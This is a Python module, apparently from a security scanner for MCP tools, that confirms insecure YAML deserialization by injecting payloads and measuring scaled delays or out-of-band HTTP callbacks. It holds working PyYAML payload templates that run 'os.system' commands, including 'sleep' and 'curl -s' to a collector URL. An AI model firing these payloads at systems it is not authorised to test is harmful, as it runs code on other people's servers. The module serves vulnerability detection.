"""Deserialization Oracle — confirms insecure deserialization vulnerabilities by effect.

Distinguishes actual object deserialization from argument reflection and parse errors using:
1. Scaled time-based confirmation (primary, reflection-immune):
   A payload only produces a delay if the object is actually constructed by an unsafe
   loader (e.g. time.sleep on PyYAML UnsafeLoader). Requires delay to scale across
   two durations (d1 and d2 = d1 + 2) relative to baseline latency.
2. Out-of-band HTTP interaction (optional):
   If an OOB collector is provided, verifies that object construction triggered an
   outbound HTTP request.
"""

from __future__ import annotations

import asyncio
import inspect
import json
import logging
import math
import time
from typing import Any, Callable

from .command_injection import OracleResult

logger = logging.getLogger(__name__)

TIME_PAYLOAD_TEMPLATES = [
    "!!python/object/apply:time.sleep [{D}]",
    '!!python/object/apply:os.system ["sleep {D}"]',
    "--- !<tag:yaml.org,2002:python/object/apply:time.sleep> [{D}]",
]

OOB_PAYLOAD_TEMPLATES = [
    '!!python/object/apply:os.system ["curl -s {url}"]',
    '--- !<tag:yaml.org,2002:python/object/apply:os.system> ["curl -s {url}"]',
]


def _extract_text(val: Any) -> str:
    """Extract plain text string from str, CallToolResult, dict, or object."""
    if val is None:
        return ""
    if isinstance(val, str):
        return val
    if hasattr(val, "content"):
        content = getattr(val, "content", [])
        texts = []
        for block in content:
            t = getattr(block, "text", None)
            if t is not None:
                texts.append(str(t))
        return "\n".join(texts)
    if isinstance(val, (dict, list)):
        try:
            return json.dumps(val)
        except Exception:
            return str(val)
    return str(val)


async def _invoke_call_fn(
    call_fn: Callable[..., Any], tool_name: str, args: dict[str, Any]
) -> tuple[str, float]:
    """Invoke call_fn which may be sync or async, returning (response_text, elapsed_seconds)."""
    t0 = time.monotonic()
    res = call_fn(tool_name, args)
    if inspect.isawaitable(res):
        res = await res
    measured_elapsed = time.monotonic() - t0

    if isinstance(res, tuple) and len(res) >= 2:
        return _extract_text(res[0]), float(res[1])

    return _extract_text(res), measured_elapsed


async def confirm_deserialization(
    call_fn: Callable[..., Any],
    tool_name: str,
    param_name: str,
    base_args: dict[str, Any] | None = None,
    collector: Any = None,
    baseline_latency_ms: float = 0.0,
) -> OracleResult:
    """Confirm insecure deserialization via scaled timing or out-of-band interaction.

    Args:
        call_fn: Callable(tool_name, args) -> (response_text, elapsed_seconds) or response_text
        tool_name: Target MCP tool name
        param_name: Parameter under test
        base_args: Baseline template arguments dictionary
        collector: Optional active OOBCollector instance
        baseline_latency_ms: Measured baseline latency in milliseconds

    Returns:
        OracleResult with confirmation status, method, evidence, and triggering payload.
    """
    base_args = dict(base_args or {})

    # ═══════════════════════════════════════════════════════════════
    # METHOD 1: Scaled Time-Based Differential Oracle
    # ═══════════════════════════════════════════════════════════════
    base_sec = max(0.0, float(baseline_latency_ms) / 1000.0)
    d1 = max(5, int(math.ceil(base_sec)) + 4)
    d2 = d1 + 2

    for tmpl in TIME_PAYLOAD_TEMPLATES:
        p1 = tmpl.format(D=d1)
        args1 = dict(base_args)
        args1[param_name] = p1

        try:
            _, elapsed1 = await _invoke_call_fn(call_fn, tool_name, args1)
        except Exception:
            continue

        if elapsed1 >= (base_sec + d1 * 0.8):
            p2 = tmpl.format(D=d2)
            args2 = dict(base_args)
            args2[param_name] = p2

            try:
                _, elapsed2 = await _invoke_call_fn(call_fn, tool_name, args2)
            except Exception:
                continue

            if elapsed2 >= (base_sec + d2 * 0.8) and (elapsed2 - elapsed1) >= ((d2 - d1) * 0.7):
                return OracleResult(
                    confirmed=True,
                    method="time-based",
                    evidence=(
                        f"Scaled time-based delay confirmed: {elapsed1:.2f}s (sleep {d1}s) "
                        f"and {elapsed2:.2f}s (sleep {d2}s) against baseline {base_sec:.2f}s"
                    ),
                    payload=p1,
                )

    # ═══════════════════════════════════════════════════════════════
    # METHOD 2: Out-Of-Band (OOB) HTTP Interaction (if collector passed)
    # ═══════════════════════════════════════════════════════════════
    if collector is not None:
        try:
            token, probe_url = collector.new_probe()
            for tmpl in OOB_PAYLOAD_TEMPLATES:
                p = tmpl.format(url=probe_url)
                args = dict(base_args)
                args[param_name] = p
                try:
                    await _invoke_call_fn(call_fn, tool_name, args)
                except Exception:
                    pass

                hit = collector.received(token, settle=2.0)
                if hit:
                    return OracleResult(
                        confirmed=True,
                        method="oob",
                        evidence=(
                            f"Out-of-band HTTP interaction received at {probe_url} "
                            f"from {hit.get('source_ip', 'unknown')}"
                        ),
                        payload=p,
                    )
        except Exception as e:
            logger.debug(f"OOB verification error in deserialization oracle: {e}")

    return OracleResult(
        confirmed=False,
        method=None,
        evidence="No unsafe deserialization confirmed",
        payload="",
    )


def confirm_deserialization_sync(
    call_fn: Callable[..., Any],
    tool_name: str,
    param_name: str,
    base_args: dict[str, Any] | None = None,
    collector: Any = None,
    baseline_latency_ms: float = 0.0,
) -> OracleResult:
    """Synchronous helper for confirm_deserialization."""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        import concurrent.futures

        with concurrent.futures.ThreadPoolExecutor() as pool:
            return pool.submit(
                asyncio.run,
                confirm_deserialization(
                    call_fn, tool_name, param_name, base_args, collector, baseline_latency_ms
                ),
            ).result()
    else:
        return asyncio.run(
            confirm_deserialization(
                call_fn, tool_name, param_name, base_args, collector, baseline_latency_ms
            )
        )
